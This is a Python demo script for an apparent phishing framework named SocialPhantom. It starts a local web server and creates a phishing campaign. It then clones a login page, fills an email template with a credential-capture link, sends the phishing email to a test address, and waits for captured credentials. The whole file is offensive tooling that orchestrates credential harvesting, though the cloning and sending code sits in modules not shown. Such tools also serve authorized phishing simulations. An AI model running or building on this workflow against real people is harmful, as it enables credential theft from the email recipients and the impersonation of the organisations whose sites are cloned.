#!/usr/bin/env python3
import os
import time
import logging
from core.campaign_manager import CampaignManager
from core.web_server import run_server
from multiprocessing import Process

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def run_demo():
    """Demonstrate the complete SocialPhantom workflow"""
    try:
        # Start web server in background
        server = Process(target=run_server, kwargs={'port': 5000})
        server.start()
        logger.info("Started web server on port 5000")

        # Initialize campaign manager
        cm = CampaignManager()

        # 1. Create a test campaign
        campaign_name = "demo_phishing"
        if cm.create_campaign(campaign_name, "phish"):
            logger.info(f"Created campaign: {campaign_name}")
        else:
            raise Exception("Failed to create campaign")

        # 2. Clone a test website
        from modules.web_cloner import WebCloner
        wc = WebCloner()
        test_url = "https://example.com/login"  # Replace with test URL
        clone_dir = f"campaigns/{campaign_name}/clones/example_clone"
        
        if wc.clone_site(test_url, clone_dir, campaign_name):
            logger.info(f"Successfully cloned {test_url} to {clone_dir}")
        else:
            raise Exception("Website cloning failed")

        # 3. Send test emails
        from modules.email_sender import EmailSender
        es = EmailSender()
        
        # Test recipient - in real usage this would be from a target list
        test_recipient = "test@example.com"  
        template_file = "templates/phishing_template.html"
        
        # Replace placeholder in template
        with open(template_file) as f:
            content = f.read().replace(
                "{{verification_link}}", 
                "http://localhost:5000/capture"
            )
        
        temp_template = f"campaigns/{campaign_name}/templates/test_email.html"
        with open(temp_template, 'w') as f:
            f.write(content)

        if es.send_phishing_email(temp_template, test_recipient, campaign_name):
            logger.info(f"Sent test email to {test_recipient}")
        else:
            raise Exception("Email sending failed")

        logger.info("Demo completed successfully. Waiting for credentials...")
        logger.info("Press Ctrl+C to stop the server")
        
        # Keep server running
        while True:
            time.sleep(1)

    except Exception as e:
        logger.error(f"Demo failed: {e}")
    finally:
        server.terminate()
        logger.info("Stopped web server")

if __name__ == '__main__':
    run_demo()
